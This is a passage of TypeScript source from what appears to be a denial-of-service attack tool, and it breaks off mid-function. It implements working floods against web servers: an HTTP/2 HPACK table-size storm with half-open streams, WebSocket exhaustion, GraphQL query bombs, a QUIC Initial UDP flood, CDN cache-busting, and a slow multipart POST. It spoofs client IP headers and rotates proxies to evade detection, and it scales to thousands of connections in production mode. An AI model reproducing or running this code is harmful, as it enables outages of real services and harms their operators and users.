//  Layer 1 — SETTINGS_HEADER_TABLE_SIZE storm:
//    Rapidly alternate HPACK table size 0 ↔ 65536. RFC 7541 §4.2: when size
//    decreases, the server MUST evict dynamic table entries until the table fits.
//    HPACK table size = 0 → server clears entire dynamic table.
//    HPACK table size = 65536 → server re-enables full 64KB table.
//    Each change triggers mandatory table eviction + state bookkeeping.
//    At 100+ changes/sec, server is locked in constant alloc/clear/alloc cycles.
//
//  Layer 2 — Half-open stream accumulation:
//    Open OPEN_STREAMS half-open streams (HEADERS without END_STREAM).
//    Server allocates state for each (goroutine / worker slot / connection context).
//    These streams block server resources while the SETTINGS storm runs.
//
//  Layer 3 — WINDOW_UPDATE flood on every open stream:
//    Repeatedly send WINDOW_UPDATE frames on all open streams + connection.
//    Server must process each to update its send flow-control state per stream.
//    RFC 7540 §6.9: each WINDOW_UPDATE triggers per-stream recalculation.
//
//  DEV: 60 slots | PROD: 400 slots
// ─────────────────────────────────────────────────────────────────────────
async function runH2SettingsStorm(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
  const OPEN_STREAMS = !IS_PROD ? 20 : 50; // PROD: 50 half-open streams × 800 slots = 40K pending streams (still effective)

  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SACK    = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // SETTINGS frame with single SETTINGS_HEADER_TABLE_SIZE (id=0x0001) param
  const mkSettingsHTS = (tableSize: number): Buffer => {
    const p = Buffer.allocUnsafe(6);
    p.writeUInt16BE(0x0001, 0); // SETTINGS_HEADER_TABLE_SIZE
    p.writeUInt32BE(tableSize, 2);
    return mkFrame(0x04, 0x00, 0, p);
  };

  const SETTINGS_CLEAR = mkSettingsHTS(0);     // clears HPACK dynamic table entirely
  const SETTINGS_FULL  = mkSettingsHTS(65536); // restores 64KB HPACK table

  // WINDOW_UPDATE frame: stream 0 (connection) or stream N
  const mkWU = (streamId: number, increment: number): Buffer => {
    const p = Buffer.allocUnsafe(4);
    p.writeUInt32BE(increment & 0x7fffffff, 0);
    return mkFrame(0x08, 0x00, streamId, p);
  };

  // HEADERS frame WITHOUT END_STREAM — opens a stream that server must keep alive
  const mkOpenHeaders = (sid: number): Buffer => {
    const hBuf = Buffer.from(hostname);
    const hpack = Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),     // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, hBuf.length]), hBuf, // :authority literal incremental-index
    ]);
    return mkFrame(0x01, 0x04, sid, hpack); // 0x04 = END_HEADERS only (no END_STREAM)
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {
      let settled = false;
      const done  = () => { if (!settled) { settled = true; resolve(); } };

      sock.once("secureConnect", () => {
      // Send client preface + initial SETTINGS (full table) + ACK
      sock.write(Buffer.concat([PREFACE, SETTINGS_FULL, SACK]));
      localPkts++; localBytes += PREFACE.length + SETTINGS_FULL.length + SACK.length;

      // Open OPEN_STREAMS half-open streams (no END_STREAM → server holds them open)
      let topStreamId = 1;
      for (let i = 0; i < OPEN_STREAMS; i++) {
        const f = mkOpenHeaders(topStreamId);
        sock.write(f);
        localPkts++; localBytes += f.length;
        topStreamId += 2;
      }

      // Also expand connection-level window to max so server can send data
      const connWU = mkWU(0, 0x3fffffff);
      sock.write(connWU);
      localPkts++; localBytes += 13;

      // Storm loop — run as fast as the event loop allows
      // Frames are small (15B SETTINGS + 13B × OPEN_STREAMS WU) so no backpressure needed
      let toggle = false;
      const storm = () => {
        if (signal.aborted || sock.destroyed) { done(); return; }

        // Layer 1: alternate SETTINGS_HEADER_TABLE_SIZE (clear ↔ full)
        // Each change forces server to evict/restore entire HPACK dynamic table
        const settings = toggle ? SETTINGS_CLEAR : SETTINGS_FULL;
        toggle = !toggle;
        sock.write(settings);
        localPkts++; localBytes += settings.length;

        // Layer 3: WINDOW_UPDATE on every open stream + connection
        // Moderate increment (8192) to stay well below the 2^31-1 overflow boundary
        for (let sid = 1; sid < topStreamId; sid += 2) {
          const wu = mkWU(sid, 8192);
          sock.write(wu);
          localPkts++; localBytes += 13;
        }
        const cWU = mkWU(0, 8192);
        sock.write(cWU);
        localPkts++; localBytes += 13;

        setImmediate(storm);
      };
      storm();
    });

      sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
      sock.on("timeout", () => { sock.destroy(); done(); });
      sock.on("error",   () => { done(); });
      sock.on("close",   () => { done(); });
      signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneSlot

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WEBSOCKET EXHAUSTION
//
//  Opens thousands of WebSocket connections and holds them open with periodic
//  pings (every 20s). Servers allocate a goroutine/thread/fiber per WS
//  connection — far more expensive than HTTP since WS is stateful.
//  nginx: reserves a keepalive_requests slot + worker_connection slot per WS.
//  Node.js targets: allocates an EventEmitter + parser per ws socket.
//
//  DEV cap: 400 sockets | PROD: 5,000 sockets
// ─────────────────────────────────────────────────────────────────────────
async function runWSFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const MAX_CONNS = !IS_PROD ? Math.min(threads * 4, 400) : Math.min(threads * 15, 5000); // 5K WS × 40KB = 200MB per worker
  const useHttps  = targetPort === 443;

  const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
                     "/stream", "/events", "/push", "/realtime", "/notify", "/feed", "/"];
  // WebSocket ping frame: FIN=1, opcode=0x9 (ping), no mask, length=0
  const PING_FRAME = Buffer.from([0x89, 0x00]);

  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");

  const oneWs = async (): Promise<void> => {
    if (signal.aborted) return;

    const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
    const key    = wsKey();
    const req = [
      `GET ${path} HTTP/1.1`,
      `Host: ${hostname}`,
      `Upgrade: websocket`,
      `Connection: Upgrade`,
      `Sec-WebSocket-Key: ${key}`,
      `Sec-WebSocket-Version: 13`,
      `Origin: https://${hostname}`,
      `User-Agent: ${randUA()}`,
      `Cache-Control: no-cache`,
      `X-Forwarded-For: ${randIp()}`,
      ``, ``,
    ].join("\r\n");

    let sock: net.Socket;
    if (useHttps) {
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    return new Promise<void>(resolve => {

    sock.setTimeout(130_000);

    let upgraded = false, settled = false, pingIv: NodeJS.Timeout | null = null;
    let respBuf  = "";
    const done = () => {
      if (!settled) {
        settled = true;
        if (upgraded) activeConns = Math.max(0, activeConns - 1);
        if (pingIv) { clearInterval(pingIv); pingIv = null; }
        resolve();
      }
    };

    const onConnect = () => {
      sock.write(req);
      localPkts++; localBytes += req.length;
    };
    if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
    else sock.once("connect", onConnect);

    sock.on("data", (data: Buffer) => {
      if (!upgraded) {
        respBuf += data.toString("ascii");
        if (respBuf.includes("101")) {
          upgraded = true; activeConns++;
          localPkts++; localBytes += 200;

          // ★ v3 WebSocket Amplification: send subscription registration immediately
          // GraphQL-over-WS: server allocates subscription state + data fetcher goroutine per sub
          const GQL_TYPES = ["users","posts","comments","orders","notifications","messages","events","feeds"];
          const gqlSubs = [
            `{"type":"connection_init","payload":{}}`,
            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{${GQL_TYPES[randInt(0,GQL_TYPES.length)]}Updated{id name createdAt data}}"}}`,
            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{onMessage{id body from to timestamp}}"}}`,
          ];
          // STOMP-style subscription (works on Spring/ActiveMQ backends)
          const stompSub = `SUBSCRIBE\ndestination:/topic/${randStr(8)}\nid:sub-${randStr(4)}\n\n\x00`;
          // Socket.io subscription
          const sioSub = `42["subscribe","${GQL_TYPES[randInt(0,GQL_TYPES.length)]}","*"]`;

          // Send initial subscription messages
          for (const msg of gqlSubs) {
            const encoded = Buffer.from(msg, "utf8");
            const len = encoded.length;
            const hdr = len < 126
              ? Buffer.from([0x81, len])
              : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
            try { sock.write(Buffer.concat([hdr, encoded])); localPkts++; localBytes += hdr.length + len; } catch { /**/ }
          }
          // Also try STOMP and Socket.io
          for (const msg of [stompSub, sioSub]) {
            const encoded = Buffer.from(msg, "utf8");
            const len = encoded.length;
            const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
            try { sock.write(Buffer.concat([hdr, encoded])); } catch { /**/ }
          }

          // ★ HIGH-FREQUENCY frame storm: 800ms interval (was 8000ms — 10× more aggressive)
          // Each frame: server must parse WS frame header + allocate message buffer + process
          // At 800ms × 1000 conns = 1250 server-side parse+alloc operations/sec
          pingIv = setInterval(() => {
            if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
            try {
              const r = Math.random();
              if (r < 0.30) {
                // Large binary frame (16KB–128KB) — forces server buffer alloc + message parse
                const frameSize = randInt(16384, 131072);
                const frameHdr  = Buffer.from([0x82, 127,
                  0, 0, 0, 0,
                  (frameSize >> 24) & 0xff, (frameSize >> 16) & 0xff,
                  (frameSize >> 8)  & 0xff,  frameSize         & 0xff,
                ]);
                const payload = Buffer.allocUnsafe(frameSize);
                for (let i = 0; i + 4 <= frameSize; i += 4)
                  payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
                sock.write(Buffer.concat([frameHdr, payload]));
                localPkts++; localBytes += frameHdr.length + frameSize;
              } else if (r < 0.60) {
                // GraphQL subscription message — forces server-side subscription resolver
                const sub = gqlSubs[randInt(1, gqlSubs.length)];
                const encoded = Buffer.from(sub, "utf8");
                const len = encoded.length;
                const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
                sock.write(Buffer.concat([hdr, encoded]));
                localPkts++; localBytes += hdr.length + len;
              } else {
                // PING frame — server must ACK each one
                sock.write(PING_FRAME); localPkts++; localBytes += 2;
              }
            }
            catch { done(); }
          }, 800); // ★ 800ms (was 8000ms) — 10× amplification factor
        } else if (respBuf.length > 8192) {
          // Not a WS path — outer while-loop will try a different path automatically
          sock.destroy(); done(); return;
        }
      }
    });

    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneWs

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneWs();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONNS }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GRAPHQL INTROSPECTION DoS
//
//  Sends deeply nested GraphQL queries that cause exponential resolver CPU.
//  A 15-level nested query with aliases can multiply O(1) resolvers into O(N^15).
//  Also sends batched introspection queries (__schema traversal is expensive).
//
//  Targets: /graphql, /api/graphql, /api/v1/graphql, /query, /gql, etc.
//  Works best against unprotected GraphQL APIs (no query depth limit or cost limit).
// ─────────────────────────────────────────────────────────────────────────
async function runGraphQLDoS(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const ENDPOINTS = [
    "/graphql", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
    "/graphql/v1", "/query", "/api/query", "/gql", "/v1/graphql",
    "/admin/graphql", "/graphql/playground", "/api/v3/graphql",
  ];

  // Build deeply nested query — exponential resolver complexity
  const TYPES  = ["user", "post", "comment", "author", "likes", "followers", "following", "product", "order"];
  const FIELDS = ["id", "name", "email", "title", "body", "content", "createdAt", "updatedAt", "slug"];
  const buildNested = (depth = randInt(8, 16)): string => {
    let q = "{ ", close = "";
    for (let i = 0; i < depth; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      const f = FIELDS[randInt(0, FIELDS.length)];
      q     += `${t}(id: ${randInt(1, 999999)}) { ${f} `;
      close += " }";
    }
    return q + close + " }";
  };

  // Introspection: forces full schema traversal (expensive type resolution)
  const INTROSPECTION = `{ __schema { types { name description fields { name description type {
    name kind ofType { name kind ofType { name kind ofType { name kind } } } }
    args { name description type { name kind } } } }
    directives { name description locations } } }`;

  // Alias bombing: many aliases for the same expensive field in one request
  const buildAliasBomb = (count = randInt(30, 100)): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    const aliases = Array.from({ length: count },
      (_, i) => `a${i}: ${t}(id: ${randInt(1, 999999)}) { id name }`
    ).join(" ");
    return `{ ${aliases} }`;
  };

  // Fragment bomb: deeply-branching non-circular fragment definitions
  // Forces the server to resolve each fragment against the schema (expensive type checking),
  // build a merged selection set, and execute all fields — O(fragments × fields) per request.
  const buildFragmentBomb = (fragCount = randInt(20, 60)): string => {
    const frags: string[] = [];
    for (let i = 0; i < fragCount; i++) {
      const t = TYPES[randInt(0, TYPES.length)];
      // Each fragment spreads multiple fields — creates a wide selection set
      const fields = Array.from({ length: randInt(3, 10) },
        () => FIELDS[randInt(0, FIELDS.length)]
      ).join(" ");
      // Spread the previous fragment (if any) to chain them — forces recursive resolution
      const spread = i > 0 && Math.random() < 0.7 ? `...frag${i - 1}` : "";
      frags.push(`fragment frag${i} on ${t.charAt(0).toUpperCase() + t.slice(1)} { ${fields} ${spread} }`);
    }
    const t = TYPES[randInt(0, TYPES.length)];
    // Query uses all fragments in aliases — maximises resolver calls
    const aliases = frags.map((_, i) =>
      `a${i}: ${t}(id: ${randInt(1, 9999)}) { ...frag${i} }`
    ).join(" ");
    return frags.join("\n") + `\nquery Q { ${aliases} }`;
  };

  // ★ Mutation flood — writes are far more expensive than reads (lock acquisition + DB write)
  const buildMutationFlood = (count = randInt(20, 60)): string => {
    const ops = Array.from({ length: count }, (_, i) => {
      const t = TYPES[randInt(0, TYPES.length)];
      const T = t.charAt(0).toUpperCase() + t.slice(1);
      return `m${i}: update${T}(input:{id:${randInt(1,999999)},data:"${randStr(32)}",ts:${Date.now()}}) { id ${FIELDS[randInt(0,FIELDS.length)]} }`;
    }).join(" ");
    return `mutation M { ${ops} }`;
  };

  // ★ Directive bomb — many @skip/@include directives force per-field directive evaluation
  const buildDirectiveBomb = (): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    const fields = FIELDS.map(f =>
      `${f} @skip(if: ${Math.random() < 0.5}) @include(if: ${Math.random() < 0.5})`
    ).join(" ");
    return `{ ${t}(id: ${randInt(1,999999)}) { ${fields} } }`;
  };

  // ★ Subscription request — server allocates long-lived subscription state per request
  const buildSubscriptionBomb = (): string => {
    const t = TYPES[randInt(0, TYPES.length)];
    return `subscription S { ${t}Changed(filter:{id:${randInt(1,999999)}}) { id ${FIELDS.slice(0,4).join(" ")} } }`;
  };

  // Batched array — v3: 20–80 operations (was 5–25) = 3–4× more server computation per request
  const buildBatch = (size = randInt(20, 80)): string => {
    const ops = Array.from({ length: size }, () => {
      const r = Math.random();
      const q = r < 0.15 ? buildMutationFlood(5)
              : r < 0.30 ? buildDirectiveBomb()
              : r < 0.45 ? buildFragmentBomb()
              : r < 0.65 ? buildAliasBomb()
              : r < 0.80 ? buildSubscriptionBomb()
              : buildNested(randInt(10, 20));
      return { query: q, variables: {} };
    });
    return JSON.stringify(ops);
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const baseUrl  = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;
  let   proxyIdx = 0;

  const GQL_HEADERS = (body: string): Record<string, string> => ({
    "Content-Type":    "application/json",
    "Content-Length":  String(Buffer.byteLength(body)),
    "User-Agent":      randUA(),
    "X-Forwarded-For": randIp(),
    "X-Real-IP":       randIp(),
    "Accept":          "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control":   "no-cache",
    "Pragma":          "no-cache",
    "X-Request-ID":    randHex(16),
    "Origin":          baseUrl,
    "Referer":         baseUrl + "/",
  });

  const runThread = async (): Promise<void> => {
    while (!signal.aborted) {
      try {
        const endpoint = ENDPOINTS[randInt(0, ENDPOINTS.length)];
        const url      = baseUrl + endpoint;

        const r        = Math.random();
        const isIntro  = r < 0.15;
        const isFrag   = r < 0.35;
        const isBatch  = r < 0.60;
        const body     = isIntro
          ? JSON.stringify({ query: INTROSPECTION })
          : isFrag  ? JSON.stringify({ query: buildFragmentBomb() })
          : isBatch ? buildBatch()
          : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });

        const headers = GQL_HEADERS(body);

        // Route through proxy when available (95% of requests)
        if (proxies.length > 0 && Math.random() < 0.95) {
          const proxy = pickProxy(proxies);
          try {
            const bytes = await fetchViaProxy(url, proxy, "POST", headers, body);
            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
          if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
          continue;
        }

        const ac    = new AbortController();
        const timer = setTimeout(() => ac.abort(), 12_000);
        try {
          await fetch(url, {
            method:  "POST",
            signal:  ac.signal,
            headers,
            body,
          });
          clearTimeout(timer);
          localPkts++; localBytes += body.length + 200;
        } catch { clearTimeout(timer); }
      } catch { /* swallow */ }
      // Tiny yield to avoid monopolising the event loop
      if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
    }
  };

  await Promise.all(Array.from({ length: Math.min(threads, 2000) }, () => runThread())); // 32GB: 2K HPACK bombs × 100KB = 200MB
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  QUIC / HTTP3 FLOOD
//
//  Sends UDP packets with QUIC Long Header + CRYPTO frame (RFC 9000).
//  Each packet looks like a QUIC Initial — server allocates state per
//  unique DCID, consumes CPU for header protection + decryption attempt.
//  Targets port 443/UDP on HTTP/3-capable servers. Falls back to raw UDP
//  flood for non-QUIC targets. Random DCIDs prevent dedup.
// ─────────────────────────────────────────────────────────────────────────
async function runQUICFlood(
  resolvedHost: string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);   // 32GB: 64 UDP sockets
  const INFLIGHT  = !IS_PROD ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
  const PKTSIZE   = 1200; // QUIC minimum MTU

  const makeQUICInitial = (): Buffer => {
    const dcidLen = 8 + (Math.random() * 12 | 0);
    const scidLen = 8;
    const dcid = Buffer.allocUnsafe(dcidLen);
    const scid = Buffer.allocUnsafe(scidLen);
    for (let i = 0; i < dcidLen; i++) dcid[i] = Math.random() * 256 | 0;
    for (let i = 0; i < scidLen; i++) scid[i] = Math.random() * 256 | 0;
    const hdr = Buffer.allocUnsafe(7 + dcidLen + scidLen);
    let off = 0;
    hdr[off++] = 0xC0 | (Math.random() * 4 | 0);  // Long Header | Initial
    hdr.writeUInt32BE(0x00000001, off); off += 4;   // QUIC v1
    hdr[off++] = dcidLen;
    dcid.copy(hdr, off); off += dcidLen;
    hdr[off++] = scidLen;
    scid.copy(hdr, off);
    // CRYPTO frame payload (fake ClientHello bytes)
    const payload = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - 6));
    payload[0] = 0x06; // CRYPTO frame type
    payload[1] = 0x00; payload[2] = 0x00; // offset = 0
    payload.writeUInt16BE(payload.length - 4, 3); // length field
    for (let i = 4; i < payload.length; i++) payload[i] = Math.random() * 256 | 0;
    return Buffer.concat([hdr, Buffer.from([0x00, 0x01]), payload]); // pkt num + payload
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const pending: Promise<void>[] = [];
  for (let i = 0; i < NUM_SOCKS; i++) {
    const s = dgram.createSocket("udp4");
    pending.push(new Promise<void>(resolve => {
      if (signal.aborted) { resolve(); return; }
      let inflight = 0;
      let reschedPending = false;
      const send = () => {
        reschedPending = false;
        if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
        while (inflight < INFLIGHT) {
          inflight++;
          const pkt = makeQUICInitial();
          s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
            inflight--;
            if (!err) { localPkts++; localBytes += pkt.length; }
            if (signal.aborted) {
              if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
            } else if (!reschedPending) {
              // Schedule ONE reschedule per event-loop tick to avoid timer starvation.
              // setImmediate lets the 300ms stats timer fire between batches.
              reschedPending = true;
              setImmediate(send);
            }
          });
        }
      };
      s.on("error", () => { resolve(); });
      send();
      signal.addEventListener("abort", () => {
        if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
      }, { once: true });
    }));
  }

  await Promise.all(pending);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CACHE POISONING DoS
//
//  Poisons CDN/reverse-proxy cache with requests that generate unique
//  cache keys → evicts legitimate content, forces origin miss rate to 100%.
//  Techniques:
//    1. Random bust params → each request = new cache entry
//    2. X-Forwarded-Host / X-Original-URL → host-keyed cache pollution
//    3. Range: bytes=N-M → partial-content fragments fill object store
//    4. Fake CF-Connecting-IP → IP-keyed cache segmentation
//    5. Vary-intensive headers → multiplies entries per resource URL
//  Effective against: Cloudflare, Fastly, Akamai, Varnish, Nginx proxy_cache
// ─────────────────────────────────────────────────────────────────────────
async function runCachePoison(
  base:    string,
  threads: number,
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots

  const rand    = (n: number) => Math.random() * n | 0;
  const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
  const rIP     = () => `${rand(256)}.${rand(256)}.${rand(256)}.${rand(256)}`;
  const rBytes  = () => `bytes=${rand(10000)}-${rand(10000) + rand(1000)}`;
  let   pIdx    = 0;

  const POISONS: Array<() => Record<string, string>> = [
    () => ({ "X-Forwarded-Host": `${rHex(8)}.evil.null`, "X-Host": `${rHex(6)}.cdn.void` }),
    () => ({ "X-Original-URL": `/${rHex(4)}/admin/${rHex(6)}`, "X-Rewrite-URL": `/secret/${rHex(4)}` }),
    () => ({ "Accept-Encoding": ["br", "zstd", "identity", "gzip, br"][rand(4)] }),
    () => ({ "Range": rBytes(), "If-Range": new Date(Date.now() - rand(86400000)).toUTCString() }),
    () => ({ "Cookie": `buster=${rHex(16)}; sid=${rHex(32)}; track=${rHex(8)}` }),
    () => ({ "CF-Connecting-IP": rIP(), "True-Client-IP": rIP(), "X-Real-IP": rIP() }),
    () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
    () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
  ];
  const PATHS = ["/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q="];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const runSlot = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }
    const loop = async () => {
      while (!signal.aborted) {
        const poison = POISONS[rand(POISONS.length)]();
        const path   = PATHS[rand(PATHS.length)];
        const url    = `${base}${path}${rHex(8)}`;
        const hdrs: Record<string, string> = {
          "User-Agent":    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${120 + rand(15)}.0.0.0 Safari/537.36`,
          "Accept":        "text/html,application/xhtml+xml,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          "Cache-Control": "no-store, no-cache, must-revalidate",
          "Pragma":        "no-cache",
          "X-Request-ID":  rHex(16),
          ...poison,
        };
        // Route through proxy (95% when available) — each request from different IP = different cache key
        if (proxies.length > 0 && Math.random() < 0.95) {
          const proxy = pickProxy(proxies);
          try {
            const bytes = await fetchViaProxy(url, proxy, "GET", hdrs);
            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
          continue;
        }
        try {
          const ac   = new AbortController();
          const t    = setTimeout(() => ac.abort(), 8_000);
          const res  = await fetch(url, { method: "GET", signal: ac.signal, headers: hdrs });
          clearTimeout(t);
          const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
          localPkts++;
          localBytes += body.byteLength || 500;
        } catch { /* absorb */ }
      }
      resolve();
    };
    loop();
  });

  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  RUDY v2 — Multipart Slow POST
//
//  Enhanced R.U.D.Y using multipart/form-data with a 512-byte boundary.
//  Server must buffer the entire body waiting for the closing --BOUNDARY--
//  that never arrives. Trickling 1 byte every SEND_MS keeps the thread
//  allocated. Harder to detect than plain R.U.D.Y (content-type differs).
//  DEV: 60 slots | PROD: 800 slots
// ─────────────────────────────────────────────────────────────────────────
async function runRUDYv2(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
  const SEND_MS   = 5_000;

  const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  const BOUNDARY = Array.from({ length: 70 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");

  let openConns = 0;
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  let pIdx = 0;

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    // Use mkTLSSock for proxy rotation — each RUDY connection comes from a different IP
    const sock = await mkTLSSock(proxies.length > 0 ? proxies : [], pIdx++, resolvedHost, hostname, targetPort)
      .catch(() => null);
    if (!sock || signal.aborted) return;

    const reqLine = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
    const partHdr = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;

    return new Promise<void>(resolve => {
      sock.setTimeout(120_000);
      const startData = () => {
        openConns++;
        sock.write(reqLine + partHdr);
        localPkts++; localBytes += reqLine.length + partHdr.length;
        const iv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { clearInterval(iv); return; }
          try { sock.write(Buffer.from([65 + (Math.random() * 26 | 0)])); localPkts++; localBytes += 1; }
          catch { clearInterval(iv); }
        }, SEND_MS);
        signal.addEventListener("abort", () => { clearInterval(iv); try { sock.destroy(); } catch { /**/ } }, { once: true });
      };

      if ((sock as tls.TLSSocket).authorized !== undefined) {
        // Already connected TLS socket from mkTLSSock
        startData();
      } else {
        (sock as net.Socket).once("connect", startData);
      }

      const onEnd = () => {
